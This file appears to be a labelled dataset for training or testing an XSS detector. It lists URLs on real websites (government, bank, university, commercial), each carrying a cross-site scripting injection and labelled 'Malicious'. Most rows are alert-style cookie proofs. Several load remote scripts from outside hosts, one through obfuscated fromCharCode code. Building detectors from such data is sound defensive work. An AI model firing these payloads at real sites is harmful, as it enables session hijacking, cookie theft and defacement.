Payloads,Class
http://www.realschule-lauda.tbb.bw.schule.de/cms/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/sc<br>ript&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://bbs.leobbs.com/cgi-bin/register.cgi?forum=80%22%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c%65%<br>72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%32%2c%3<br>1%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c%34%36<br>%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious
"https://topup.orange.com/?_lang=""><script>alert(document.cookie)</script>",Malicious
http://www.accordionprofile.net/guestbook/index.php?lang=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;<br>marquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.ooo.lt/index.php?query=%22%3cscript%3ealert%287%29%3b%3c%2fscript%3e&amp;action=search&amp;lang=l<br>t&amp;search=,Malicious
"http://www.security-online.nl/woorden.php?bw=zoek&amp;taal=nl&amp;letter=&amp;zoek3=%22%3e%3cscript%3ealert(stri<br>ng.fromcharcode(88,83,83));%3c/script%3e",Malicious
http://www.tradebit.com/searchfiles.php?keywords=%3c/title%3e%3cscript%3ealert(1)%3c/script%3e,Malicious
http://www.senat.fr/newsletter/senat_lettre//message.php?strpagesuivante=&amp;strtitrepage=abonnement+%3<br>a+erreur+%21&amp;strtitrearrondi=abonnement+%3a+erreur+%21&amp;strmessage=%22%3e%3cscript%20src=http://ha.ck<br>ers.org/s.js%3e%3c/script%3e,Malicious
http://www.kalekockayayibo.k12.tr/galeri/login.asp?n=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by<br>+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://wevent.org/groups/search?group%5bname%5d=%22%3e%3cscript%3ealert%281%29%3c%2fscript%3e,Malicious
http://joy-shop.net/search.php?cmd=search&amp;category1_s='%3e%22%3e%3cscript/src=http://kusomiso.com/x.<br>js%3e%3c/script%3e,Malicious
http://www.globalentry.gov/xp/cgov/offsiteredirectpg.xml?title=+%22%3e%3cscript%3ealert%28document.c<br>ookie%29%3c/script%3e+&amp;url=http%3a%2f%2fwww.globalentry.gov%2f&amp;referrer=/xp/cgov/printme.xml,Malicious
http://aquarius-freeserver.no-ip.info/orz/orz.cgi/-/wwwww.2ch.net/news4vip/'%3e%22%3e'%3e%3cscript%3<br>ealert(%22xss%20by%20kusomiso.com%22)%3c/script%3e,Malicious
http://mail.lzsafety.gov.cn:6080/badlogin.php?tid=0&amp;retid=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;<br>p+,Malicious
http://m.fotolog.com/search.php?auth=%3ch1%3erme%20pwnea%20de%20nuevo%3c/h1%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e%3cnoscript%3e,Malicious
http://www.maib.gov.uk/search_results.cfm?lcl_lngcode=en&amp;st=sloop&amp;swt=&amp;lcl_othrlngsite=&amp;order_by=&amp;zo<br>nes=&amp;lcl_lngurlcode=&amp;lcl_topmenutemplate=tags/top_home.cfm&amp;lcl_mystartrow=21%27%22%3e%3c/title%3e%3c<br>script%3ealert(1337)%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marque<br>e%3e,Malicious
http://wutzup.com/store/gallery/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;<br>&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://members.webs.com/membersb/widgetbank/browse.jsp?query=&lt;script&gt;alert(/xss found by<br>rugburn/)&lt;/script&gt;,Malicious
http://www.alteclansing.com/index.php?file=search-res&amp;seachtext=%22%3e%3cmarquee%3e%3ch1%3edefaced%2<br>0by%20ironzorg%3c/h1%3e%3c/marquee%3e,Malicious
http://www.pokemonquest.net/guestbook/index.php?lang=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marq<br>uee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://inteltransport.e-transport.gov.gr/simplesearch.asp?keyword=%3cscript%3ealert%28string.fromcha<br>rcode%2883%2c116%2c64%2c82%2c45%2c103%2c97%2c90%2c51%2c114%29%29%3c%2fscript%3e%3cmarquee%3e%3ch1%3e<br>st%40r-gaz3r%3c%2fh1%3e%3c%2fmarquee%3e&amp;section=1,Malicious
http://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.com/home.php?l=en&amp;token=v1hokoclcs0kewj<br>a9n7gzcqoahuyw4ekhb4uhcuyayaamirwoam4dq&amp;q=%27%3e%22%3e%3cscript%2fsrc%3dhttp%3a%2f%2fkusomiso.com%2f<br>x.js%3e%3c%2fscript%3e,Malicious
http://www.radiohaus.com.br/busca.php?cat=0&amp;keyword=%3cscript%3ealert%28%22fzero+rules+%3b%29%22%29%<br>3c%2fscript%3e,Malicious
http://applexcore.com/forum/redirector.php?url=%22%3e%3cscript%3ealert(2)%3c/script%3e,Malicious
http://www.dcari.net/showcategory.php?type=6&amp;keyword=&quot;&gt;&lt;script&gt;alert(backdoor)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1<br>&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.hydrogen.gov/%7d%3c/style%3e%3cscript%3ea=eval;b=alert;a(b(/xss/.source));%3c/script%3e%3<br>cscript%3ea=eval;b=alert;a(b(/xss/.source));%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xy<br>litol%3c/h1%3e%3c/marquee%3e,Malicious
http://www.gxt.it/gxt-ke-ti-guardi-popup_foto.php?nf=%20%27%22%3e%3cimg%20src=foo.png%20onerror=aler<br>t(/xss/)%20/%3e%3cmarquee%20bgcolor=%22red%22%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://www.podzem.ru/send.php?f_feedbackname=%3cscript%3ealert(document.cookie);%3c/script%3e,Malicious
http://www.birdssilos.com.au/igallery.asp?d=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcotic<br>xs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://kansascity.royals.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script&gt;,Malicious
http://tw.content.mobile.yahoo.com/searchresult.php?search_text=foooo&lt;script&gt;alert('soroush.secproje<br>ct.com --&gt; irsdl is here! simple xss attack!')&lt;/script&gt;,Malicious
http://www.pls48.net/gallery/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1<br>&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://footyzone.info/hostingsite/view.php?view=b44a59383b3123a747d139bd0e71d2df.jpg%22%3e%3cscript%<br>3ealert%28document.cookie%29;%3c/script%3e,Malicious
http://www.ilsoftware.it/cercadl.asp?ric=lib&amp;stringa=k&amp;dove=%22%3e%3cscript%3ealert%28%2fxss+by+redt<br>uning%2f%29%3b%3c%2fscript%3e&amp;ord=dl,Malicious
"http://pdsimg.jpl.nasa.gov/cgi-bin/mpf/mpf_search.pl?application_packet_id=%22%3e%3cimg+onerror=aler<br>t(string.fromcharcode(120,115,115))+src=.%",Malicious
http://www.contratos.gov.co/consultas/resultadolistadoprocesos.jsp?entidad=117005003&amp;registrosxpagin<br>a=100&amp;paginaobjetivo=1&amp;desdefomulario=true}%3c/style%3e%3cscript%3ea=eval;b=alert;a(b(/xss/.source))<br>;%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3ehttp://www.banc<br>oagrario.gov.co/webapp/jsp/paint?node=008005&amp;treeid=1&amp;treemanagerid=1%27%22%3e%3c/title%3e%3cscript%<br>3ealert(1337)%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3ehtt<br>p://www.bancoagrario.gov.co/webapp/jsp/paint?node=008005&amp;treeid=1&amp;treemanagerid=1}%3c/style%3e%3cscr<br>ipt%3ea=eval;b=alert;a(b(/xss/.source));%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xylito<br>l%3c/h1%3e%3c/marquee%3ehttp://www.bancoagrario.gov.co/webapp/jsp/paint?node=008005&amp;treeid=1&amp;treeman<br>agerid=1}%3c/style%3e%3cscript%3ea=eval;b=alert;a(b(/xss/.source));%3c/script%3e%27%22%3e%3cmarquee%<br>3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://mail.investguangzhou.gov.cn:6080/badlogin.php?tid=0&amp;lid=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scr<br>ipt&gt;&lt;p+,Malicious
http://www.moera-krg.org/search_archive.asp?frmarticlestartdateday=1&amp;frmarticlestartdatemonth=1&amp;frma<br>rticlestartdateyear=2007&amp;frmarticleenddateday=2&amp;frmarticleenddatemonth=7&amp;frmarticleenddateyear=2007&amp;<br>frmarticlerubricnr=223%2c73&amp;frmkey=&lt;h1&gt;%22%3cscript%3ealert%28%22backdoor%22%29%3c%2fscript%3e&amp;frmse<br>arch=go&amp;frmaction=search&amp;frmorigination=%2fservices%2fsearch_archive.asp&amp;lngnr=12,Malicious
http://www.marica.rj.gov.br/busca.php?palavra=%27%3balert%28string.fromcharcode%2883%2c69%2c67%2c85%<br>2c82%2c73%2c84%2c89%2c32%2c83%2c85%2c88%29%29%2f%2f%5c%27%3balert%28string.fromcharcode%2883%2c69%2c<br>67%2c85%2c82%2c73%2c84%2c89%2c32%2c83%2c85%2c88%29%29%2f%2f%22%3balert%28string.fromcharcode%2883%2c<br>69%2c67%2c85%2c82%2c73%2c84%2c89%2c32%2c83%2c85%2c88%29%29%2f%2f%5c%22%3balert%28string.fromcharcode<br>%2883%2c69%2c67%2c85%2c82%2c73%2c84%2c89%2c32%2c83%2c85%2c88%29%29%2f%2f--%3e%3c%2fscript%3e%22%3e%2<br>7%3e%3cscript%3ealert%28string.fromcharcode%2883%2c69%2c67%2c85%2c82%2c73%2c84%2c89%2c32%2c83%2c85%2<br>c88%29%29%3c%2fscript%3e&amp;tipo=n&amp;submit=ok,Malicious
http://www.jivesoftware.com/webchat/email/offline-mail.jsp?workgroup=sales2@workgroup.jivesoftware.c<br>om'&quot;&gt;%3cscript&gt;alert(1)%3c/script&gt;,Malicious
http://www.bmaroc.com/journal.php?url=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e%3e%3cmar<br>quee%3e%3ch1%3emeloulisi%3c/h1%3e%3c/marquee%3e,Malicious
"https://www.zonealarm.com/store/application;jsessionid=gawsf4c5djtd3a5pig4e7tnkov0tiu9jp0uhfst9jd7hk<br>igvl1q2!-1992105728!-1062696903!7551!7552!none?namespace=zls_user&amp;origin=glo%22%3e%3cscript%3eeval(s<br>tring.fromcharcode(97,61,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,<br>110,116,40,39,115,99,114,105,112,116,39,41,59,97,46,115,114,99,61,39,104,116,116,112,58,47,47,104,52<br>,107,46,105,110,47,105,46,106,115,39,59,100,111,99,117,109,101,110,116,46,98,111,100,121,46,97,112,1<br>12,101,110,100,67,104,105,108,100,40,97,41,59))%3c/script%3ebal.jsp&amp;event=link.login&amp;dc=34std&amp;ctry=d<br>e&amp;lang=de",Malicious
http://www.evrensel.net/koseyazi.php?txt_arsiv_tarihi=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;mar<br>quee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.mercadolibre.com.ec/ecuador/ml/l_user.main?as_filtro_id=certified_usr&as_nickname=%a0&as_pcia_id=%3e%22%3e%3cscript%3ealert%28%27xss%27%29;%3c/script%3e,Malicious
http://maymun.net/directory.php?cat=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://www.packetnews.com/search.php?kw=%22%3e%3c%2fscript%3e%3cscript%3ealert%28%2fxssed_by_omeha%2<br>f%29%3b%3c%2fscript%3e&amp;baction=1&amp;query.x=26&amp;query.y=7&amp;query=+go%21+&amp;type=0,Malicious
http://otd.harvard.edu/technologies/index.php?category=engineering/%20communications&amp;searchterm=%22%<br>3e%22%3e/r0hit/%3e%3cscript%3ealert(document.cookie)%3c/script%3e%3cscript%20src=http://iblog.ir/sty<br>le.js%3e%3c/script%3e,Malicious
http://dieter.krakor.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdo<br>or&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://blogs.zdnet.com/emailform.php?email=danchev&amp;name=dancho%20danchev%27%22%3e%3c/title%3e%3cscri<br>pt%3ealert(%27haha%20hello%20=p%27)%3c/script%3e,Malicious
http://us.trendmicro.com/us/search/?q=%22%3e+}%3c%2fstyle%3e%3cscript%3ea%3deval%3bb%3dalert%3ba%28b%28%2fxss%2f.source%29%29%3b%3c%2fscript%3e%3cmarquee+bgcolor%3d%22red%22%3e%3ch1%3exss3d+by+hari%28topsecure.net%29%3c%2fh1%3e%3c%2fmarquee%3e,Malicious
http://www.cikcik.com/forum/ilkliste.php?panoid=2&amp;sayfano=1&amp;forumbaslik=&lt;script&gt;alert(&quot;starext&quot;)&lt;/sc<br>ript&gt;,Malicious
http://z0ne-h.net/video/?catid=18&amp;cat=%22%3e%3cscript%3ealert(%22arkada%felar%20wild%204%20m%fc%20ne<br>y%20o%20hacker%20hepimiz%20lameriz%20:d%20b%fdrak%fdn%20sanal%20ile%20sal%fdnca%f0a%20girmi%fe%20gib<br>i%20oynay%fdp%20sallans%fdn%20lemo%fe%22)%3c/script%3e,Malicious
"http://www.siemens.co.uk/index.jsp?sdc_countryid=192&amp;sdc_search_filter=none&amp;sdc_search_drillnames=&amp;s<br>dc_search_drillfilter=&amp;sdc_search_cat=&amp;sdc_sectionid=0&amp;sdc_contentid=292&amp;sdc_rh=&amp;sdc_sel_arch_period<br>=&amp;sdc_search_lang=en&amp;sdc_search_country=siemens_uk&amp;sdc_ggid=&amp;sdc_flags=0&amp;sdc_pnid=0&amp;sdc_zoneid=1&amp;sdc<br>_langid=1&amp;sdc_linkid=1301581&amp;sdc_sid=18493565555&amp;sdc_bcpath=&amp;sdc_mpid=0&amp;sdc_unitid=20&amp;sdc_search_stq<br>=&amp;sdc_search_term=';alert(string.fromcharcode(88,83,83))//\';alert(string.fromcharcode(88,83,83))//%<br>22;alert(string.fromcharcode(88,83,83))//\%22;alert(string.fromcharcode(88,83,83))//--%3e%3c/script%<br>3e%22%3e'%3e%3cscript%3ealert(string.fromcharcode(88,83,83))%3c/script%3e&amp;x=0&amp;y=0",Malicious
http://speakers.nvision2008.com/agenda/index.cfm?action=sessionsbyday&amp;d=3&amp;trackid=&amp;subcategoryid=&amp;se<br>ssionaudiencelevelid=-1&amp;sessiontypeid=-1&amp;keywords=%27%22%3e%3cscript%3ealert%28%27xss%27%29%3b%3c%2f<br>script%3e,Malicious
http://information.gov.bn/phpinfo.php?cx[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]<br>[][][][][][][]=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e%3c/script%3e,Malicious
http://zodiacmatrix.com/igallery/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee<br>&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.usbank.com/usbanklocations/remotesearch.jsp?searchtype=0&amp;service=brn&amp;servicetype=brn&amp;part<br>ner=&amp;zip=60510&amp;street=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;,Malicious
http://news.onekoreanews.net/bbs_detail.php?bbs_num=8&amp;tb=board_notice&amp;b_category=%22%3e%3cscript%3ea<br>lert(/xss/)%3c/script%3e,Malicious
http://www.gspns.co.yu/redvoznje.php?zadan=2009-05-22&amp;pd=d&amp;rv=rvm&amp;linija[]=osijek&quot;&gt;&lt;script&gt;alert(doc<br>ument.cookie)&lt;/script&gt;,Malicious
http://www.portaldasantaifigenia.com.br/pag_busca.asp?lista=busca&amp;nome=%3cscript%3ealert%28document.<br>cookie%29%3c%2fscript%3e,Malicious
http://www.iutah.tv/search?search_context=245&amp;limit_srch_to_context=false&amp;words='&quot;&gt;&lt;script&gt;alert(doc<br>ument.cookie)&lt;/script&gt;,Malicious
http://www.ladyss.com/cv.php?url=02_blanc_nathalie&amp;name=%22%3e%3cmarquee%3e%3ch1%3edefaced%20by%20ir<br>onzorg%3c/h1%3e%3c/marquee%3e,Malicious
http://iletisim.erciyes.edu.tr/ilfoto/login.asp?folder=&amp;n=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;<br>&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.revistabarcelona.com.ar/archivo.php?nro=%22%3e%3ch1%3ebarcelona!%3c/h1%3e,Malicious
http://www.demoturnkey.info/software/signinform.php?msg=%3cscript%3ealert(/xssed/)%3c%2fscript%3e,Malicious
http://www.merterinsesi.net/mods.php?go=news&amp;p=dn&amp;news_id=15%22%3e%3cstyle%3ebody{background-color:b<br>lack;color:white;font:50px%20arial;}%3c/style%3e%3ch1%3eby%20st@rext%3e%3cmarquee%3ewhitehat+forever<br>+by%20st@rext%3c%2f%3cscript%3ealert(document.cookie)%3c/script%3e%3cbody%20onload=alert(/xssed/)%3e,Malicious
http://www.kolayposter.com/scripts/kayit.asp?id=3558&amp;dil=tr&amp;page=grup.asp&amp;results=&quot;&gt;&lt;script&gt;alert(do<br>cument.cookie)&lt;/script&gt;,Malicious
http://www.cancer.org/docroot/gry/gry_0.asp?txtsearch=%22%3e%3cscript%3ealert%28%27xss%27%29%3b%3c%2<br>fscript%3e&amp;dictionary=&amp;btngo.x=14&amp;btngo.y=12,Malicious
http://shop.skype.com//proxy/query.php?categoryid=2&countryid=17918&filter=&filter=&filter=&filter=&filter=&filter=&filter=&filter=&filter=&filter=&filter=&filter=&filter=&filter=&filter=&filter=&filter=&filter=&filter=&filter=&filter=&filter=&filter=&filter=&filter=&filter=&filter=&jsoncallback=%27%22%28%29%26%251%3cscript%20%3ealert%28document.cookie%29%3c%2fscript%3e&manufacture=&manufacture=&manufacture=&manufacture=&manufacture=&manufacture=&manufacture=&manufacture=&manufacture=&manufacture=&manufacture=&manufacture=&manufacture=&manufacture=&manufacture=&manufacture=&manufacture=&manufacture=&manufacture=&manufacture=&manufacture=&manufacture=&manufacture=&manufacture=&manufacture=&manufacture=&manufacture=&page=1&price_range=~75|75~150|150~225|225~|||?countryid=17918categoryid=2&price_range=~75|75~150|150~225|225~|||?countryid=17918categoryid=2&price_range=~75|75~150|150~225|225~|||?countryid=17918categoryid=2&price_range=~75|75~150|150~225|225~|||?countryid=17918categoryid=2&price_range=~75|75~150|150~225|225~|||?countryid=17918categoryid=2&price_range=~75|75~150|150~225|225~|||?countryid=17918categoryid=2&price_range=~75|75~150|150~225|225~|||?countryid=17918categoryid=2&price_range=~75|75~150|150~225|225~||||||||||||||||||||||||||||||&price_range=~75|75~150|150~225|225~|||?countryid=17918categoryid=2&price_range=~75|75~150|150~225|225~|||?countryid=17918categoryid=2&price_range=~75|75~150|150~225|225~|||?countryid=17918categoryid=2&price_range=~75|75~150|150~225|225~|||?countryid=17918categoryid=2&price_range=~75|75~150|150~225|225~|||?countryid=17918categoryid=2&price_range=~75|75~150|150~225|225~|||?countryid=17918categoryid=2&price_range=~75|75~150|150~225|225~|||?countryid=17918categoryid=2&price_range=~75|75~150|150~225|225~|||?countryid=17918categoryid=2&price_range=~75|75~150|150~225|225~|||?countryid=17918categoryid=2&price_range=~75|75~150|150~225|225~|||?countryid=17918categoryid=2&price_range=~75|75~150|150~225|225~|||?countryid=17918categoryid=2&price_range=~75|75~150|150~225|225~|||?countryid=17918categoryid=2&price_range=~75|75~150|150~225|225~|||?countryid=17918categoryid=2&price_range=~75|75~150|150~225|225~|||?countryid=17918categoryid=2&price_range=~75|75~150|150~225|225~|||?countryid=17918categoryid=2&price_range=~75|75~150|150~225|225~|||?countryid=17918categoryid=2&price_range=~75|75~150|150~225|225~|||?countryid=17918categoryid=2&price_range=~75|75~150|150~225|225~|||?countryid=17918categoryid=2&price_range=~75|75~150|150~225|225~|||?countryid=17918categoryid=2&sortby=1&sortby=2&sortby=2&sortby=2&sortby=2&sortby=1&sortby=2&sortby=1&sortby=1&sortby=2&sortby=2&sortby=1&sortby=1&sortby=1&sortby=2&sortby=1&sortby=2&sortby=2&sortby=2&sortby=4&sortby=1&sortby=3&sortby=1&sortby=1&sortby=5&sortby=1&sortby=1&subcategoryid=&subcategoryid=&subcategoryid=&subcategoryid=&subcategoryid=&subcategoryid=&subcategoryid=&subcategoryid=&subcategoryid=&subcategoryid=&subcategoryid=&subcategoryid=&subcategoryid=&subcategoryid=&subcategoryid=&subcategoryid=&subcategoryid=&subcategoryid=&subcategoryid=&subcategoryid=&subcategoryid=&subcategoryid=&subcategoryid=&subcategoryid=&subcategoryid=&subcategoryid=&subcategoryid=,Malicious
http://calendar.columbia.edu/sundial/webapi/get.php?viewtype=%22%3e%3cscript%3ealert%28document.cook<br>ie%29%3c/script%3e,Malicious
http://www.kalemuftulugu.gov.tr/test/php/php_info.php?a[]=%22%3e%3cscript%3ealert(document.cookie)%3<br>c/script%3e,Malicious
"http://w1000.mv.us.adobe.com/events/main.jsp?productid=&amp;solutionid=20&amp;month=05&quot;&gt;&lt;script&gt;alert(string<br>.fromcharcode(88,83,83))&lt;/script&gt;",Malicious
http://www.research.chop.edu/research/profiles/index.php?id=%27%22%3e%3c/title%3e%3cscript%3ealert%2<br>81337%29%3c/script%3e,Malicious
http://www.rijnmond.nl/homepage/nieuws?page=1&amp;zoekterm=&amp;startdatum=&amp;einddatum=&amp;categorie=%22%3e%3csc<br>ript%3ealert%28%27killer-tr%27%29%3c%2fscript%3e,Malicious
http://it.boincstats.com/bam/register.php?email=%22%3e%3ch1%3eby%20kusomiso.com%3c/h1%3e&amp;name=%22%3e<br>%3ch1%3eby%20kusomiso.com%3c/h1%3e,Malicious
http://www.cinciva.com/igallery34/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;<br>&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
https://bankingportal.sparkasse-lemgo.de/banking/?konto=%22%3e%3ciframe%20src=http://www.google.de%3<br>e,Malicious
http://www.box2home.com.br/box2home/findresults.asp?template_id=11&amp;partner_id=&amp;mscssid=73bqpk1cjd868<br>puhdhwhv1mpxk9u8hba&amp;dept_id_busca=0&amp;spec=%3cscript+src%3dhttp%3a%2f%2fmygot.110mb.com%2flol.js%3e%3c<br>%2fscript%3e&amp;submit.x=0&amp;submit.y=0&amp;submit=ok,Malicious
http://www.rammsteinfanarea.de/?error=%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e,Malicious
http://www.wilsoncenter.org/index.cfm?fuseaction=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;<br>&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.ricardone.gov.ar/ejemplos/php/info.php?cx[][][][][][][][][][][][][][][][][][][][][][][][]<br>[][][][][][][][][][][][][]=%3cscript%3ealert(/kabus/);%3c/script%3e,Malicious
http://www.international.rai.it/tv/programmi/scheda.php?id=39'&lt;script&gt;alert(document.cookie)&lt;/script<br>&gt;,Malicious
"http://autori.citatepedia.ro/de.php?a=&lt;/title&gt;&lt;script&gt;alert(string.fromcharcode(88,83,83,101,100,32,<br>98,121,32,68,114,46,79,112,116,105,120))&lt;/script&gt;",Malicious
